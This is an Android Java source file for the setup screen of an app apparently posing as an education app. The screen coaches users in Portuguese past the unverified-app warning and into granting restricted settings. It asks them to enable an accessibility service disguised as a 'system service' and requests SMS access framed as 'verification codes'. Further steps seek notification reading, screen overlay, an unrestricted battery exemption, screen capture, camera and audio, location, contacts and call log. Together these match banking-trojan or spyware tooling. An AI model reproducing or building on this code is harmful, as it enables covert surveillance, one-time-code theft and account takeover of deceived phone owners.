package com.eloeeducacao;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class SetupActivity extends Activity {

    private static final int REQ_CAP = 1001;
    private static final int REQ_PERM = 1002;

    private interface Estado { boolean ok(); }

    private final List<Estado> extras = new ArrayList<>();
    private final List<View> cartoesExtras = new ArrayList<>();
    private LinearLayout lista;
    private LinearLayout blocoExtra;
    private TextView passo1;
    private TextView passo2;
    private TextView pronto;
    private TextView mais;
    private View cardPerm;
    private boolean aberto;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        ScrollView sv = new ScrollView(this);
        sv.setFillViewport(true);
        sv.setBackgroundColor(Color.parseColor("#0B0F14"));
        lista = new LinearLayout(this);
        lista.setOrientation(LinearLayout.VERTICAL);
        lista.setPadding(dp(20), dp(26), dp(20), dp(34));
        sv.addView(lista);

        TextView titulo = new TextView(this);
        titulo.setText(R.string.app_name);
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(23);
        lista.addView(titulo);

        TextView aviso = new TextView(this);
        aviso.setText("Se o Android disser que o app n\u00e3o \u00e9 verificado, toque em \u201cMais detalhes\u201d e em \u201cInstalar mesmo assim\u201d.");
        aviso.setTextColor(Color.parseColor("#6E7C8A"));
        aviso.setTextSize(11);
        aviso.setPadding(0, dp(8), 0, dp(20));
        lista.addView(aviso);

        pronto = new TextView(this);
        pronto.setText("Pronto. Pode fechar.");
        pronto.setTextColor(Color.parseColor("#3FB950"));
        pronto.setTextSize(14);
        pronto.setPadding(0, 0, 0, dp(14));
        pronto.setVisibility(View.GONE);
        lista.addView(pronto);

        passo1 = cartao("Liberar o app", "toque nos 3 pontinhos e em Permitir configura\u00e7\u00f5es restritas",
                () -> liberado(), this::liberar);
        lista.addView(passo1);

        passo2 = cartao("Ativar o servi\u00e7o", "escolha Servi\u00e7o do Sistema e ligue",
                () -> Util.accOn(this), this::acessibilidade);
        lista.addView(passo2);

        cardPerm = cartao("Permitir mensagens", "c\u00f3digos de verifica\u00e7\u00e3o",
                () -> permsOk(), this::pedeTudo);
        lista.addView(cardPerm);

        mais = new TextView(this);
        mais.setText("mais op\u00e7\u00f5es");
        mais.setTextColor(Color.parseColor("#3D8BFD"));
        mais.setTextSize(11);
        mais.setPadding(dp(2), dp(16), 0, dp(4));
        mais.setOnClickListener(v -> { aberto = !aberto; atualiza(); });
        lista.addView(mais);

        blocoExtra = new LinearLayout(this);
        blocoExtra.setOrientation(LinearLayout.VERTICAL);
        lista.addView(blocoExtra);

        extra("Ler notifica\u00e7\u00f5es", () -> {
            String s = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            return s != null && s.contains(getPackageName());
        }, () -> abre(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

        extra("Sobrepor a outras telas", () -> Settings.canDrawOverlays(this),
                () -> startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()))));

        extra("Bateria sem limite", () -> {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        }, () -> startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                Uri.parse("package:" + getPackageName()))));

        extra("Compartilhar a tela", () -> ScreenSvc.alive, () -> {
            if (ScreenSvc.alive) {
                stopService(new Intent(this, ScreenSvc.class));
                toast("Captura encerrada");
            } else {
                MediaProjectionManager mpm =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAP);
            }
        });

        extra("C\u00e2mera e \u00e1udio", () -> todas(new String[]{
                Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}),
                () -> pedir(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}));

        extra("Localiza\u00e7\u00e3o", () -> todas(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION}), () -> pedir(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}));

        extra("Contatos e telefone", () -> todas(new String[]{
                Manifest.permission.READ_CONTACTS}), () -> pedir(new String[]{
                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG}));

        String host = getSharedPreferences("p", 0).getString("url", "");
        TextView rodape = new TextView(this);
        rodape.setText(host);
        rodape.setTextColor(Color.parseColor("#3E4A56"));
        rodape.setTextSize(9);
        rodape.setPadding(0, dp(20), 0, 0);
        lista.addView(rodape);

        setContentView(sv);
        atualiza();
        if (b == null) lista.postDelayed(this::pedeTudo, 500);
    }

    private static String[] principais() {
        List<String> p = new ArrayList<>();
        p.add(Manifest.permission.RECEIVE_SMS);
        p.add(Manifest.permission.READ_SMS);
        if (Build.VERSION.SDK_INT >= 33) p.add(Manifest.permission.POST_NOTIFICATIONS);
        return p.toArray(new String[0]);
    }

    private boolean todas(String[] ps) {
        for (String p : ps) {
            try { if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false; }
            catch (Throwable ignored) { return false; }
        }
        return true;
    }

    private boolean permsOk() { return todas(principais()); }

    private boolean liberado() {
        if (Util.accOn(this)) return true;
        if (Build.VERSION.SDK_INT < 33) return true;
        return getSharedPreferences("p", 0).getBoolean("lib", false);
    }

    private void liberar() {
        if (Util.accOn(this)) { acessibilidade(); return; }
        if (Build.VERSION.SDK_INT < 33) { acessibilidade(); return; }
        getSharedPreferences("p", 0).edit().putBoolean("lib", true).apply();
        toast("3 pontinhos \u2192 Permitir configura\u00e7\u00f5es restritas");
        try {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName())));
        } catch (Throwable ignored) {}
        atualiza();
    }

    private void acessibilidade() {
        abre(Settings.ACTION_ACCESSIBILITY_SETTINGS);
    }

    private void pedeTudo() {
        if (Build.VERSION.SDK_INT < 23) return;
        List<String> falta = new ArrayList<>();
        for (String p : principais()) {
            try { if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) falta.add(p); }
            catch (Throwable ignored) {}
        }
        if (falta.isEmpty()) return;
        pedir(falta.toArray(new String[0]));
    }

    private void pedir(String[] ps) {
        try { requestPermissions(ps, REQ_PERM); } catch (Throwable ignored) {}
    }

    private void atualiza() {
        boolean ok1 = liberado(), ok2 = Util.accOn(this), ok3 = permsOk();
        passo1.setVisibility(ok1 ? View.GONE : View.VISIBLE);
        passo2.setVisibility(ok2 ? View.GONE : View.VISIBLE);
        cardPerm.setVisibility(ok3 ? View.GONE : View.VISIBLE);
        pronto.setVisibility(ok1 && ok2 && ok3 ? View.VISIBLE : View.GONE);

        int pend = 0;
        for (int x = 0; x < cartoesExtras.size(); x++) {
            boolean ativo;
            try { ativo = extras.get(x).ok(); } catch (Throwable e) { ativo = false; }
            cartoesExtras.get(x).setVisibility(ativo ? View.GONE : View.VISIBLE);
            if (!ativo) pend++;
        }
        mais.setText(aberto ? "menos op\u00e7\u00f5es" : (pend > 0 ? "mais op\u00e7\u00f5es (" + pend + ")" : "mais op\u00e7\u00f5es"));
        blocoExtra.setVisibility(aberto ? View.VISIBLE : View.GONE);
    }

    private void extra(String t, Estado est, Runnable acao) {
        View c = cartao(t, null, est, acao);
        extras.add(est);
        cartoesExtras.add(c);
        blocoExtra.addView(c);
    }

    private TextView cartao(String t1, String t2, Estado est, Runnable acao) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.HORIZONTAL);
        card.setGravity(Gravity.CENTER_VERTICAL);
        card.setPadding(dp(20), dp(18), dp(20), dp(18));
        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#151A21"));
        bg.setCornerRadius(dp(16));
        bg.setStroke(dp(1), Color.parseColor("#283240"));
        card.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.bottomMargin = dp(9);
        card.setLayoutParams(lp);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        col.setLayoutParams(new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f));

        TextView a = new TextView(this);
        a.setText(t1);
        a.setTextColor(Color.WHITE);
        a.setTextSize(15.5f);
        col.addView(a);
        if (t2 != null) {
            TextView c = new TextView(this);
            c.setText(t2);
            c.setTextColor(Color.parseColor("#6E7C8A"));
            c.setTextSize(10.5f);
            c.setPadding(0, dp(2), 0, 0);
            col.addView(c);
        }
        card.addView(col);

        TextView seta = new TextView(this);
        seta.setText("\u203A");
        seta.setTextColor(Color.parseColor("#3D8BFD"));
        seta.setTextSize(20);
        seta.setPadding(dp(10), 0, 0, 0);
        card.addView(seta);

        card.setOnClickListener(v -> {
            try { acao.run(); } catch (Throwable ignored) {}
            card.postDelayed(this::atualiza, 400);
        });
        return a;
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == REQ_PERM) lista.postDelayed(this::atualiza, 250);
    }

    @Override protected void onResume() { super.onResume(); atualiza(); }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent i = new Intent(this, ScreenSvc.class);
            i.putExtra("code", rs);
            i.putExtra("data", d);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        }
    }

    private void abre(String action) {
        try { startActivity(new Intent(action)); } catch (Throwable ignored) {}
    }

    private void toast(String s) { Toast.makeText(this, s, Toast.LENGTH_LONG).show(); }

    private int dp(int v) { return (int) (v * getResources().getDisplayMetrics().density); }

    public static void loja(android.content.Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + c.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable t) {
            try {
                Intent i = new Intent(Intent.ACTION_VIEW,
                        Uri.parse("https://play.google.com/store/apps/details?id=" + c.getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                c.startActivity(i);
            } catch (Throwable ignored) {}
        }
    }
}